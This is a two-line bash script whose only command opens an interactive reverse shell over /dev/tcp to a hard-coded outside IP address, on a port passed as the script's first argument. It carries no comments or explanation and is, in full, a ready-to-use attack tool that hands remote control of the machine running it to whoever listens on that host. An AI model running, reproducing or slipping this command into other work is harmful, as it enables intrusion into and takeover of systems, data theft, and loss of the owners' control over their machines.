#!/bin/bash
bash -i >& /dev/tcp/52.74.88.50/$1 0>&1
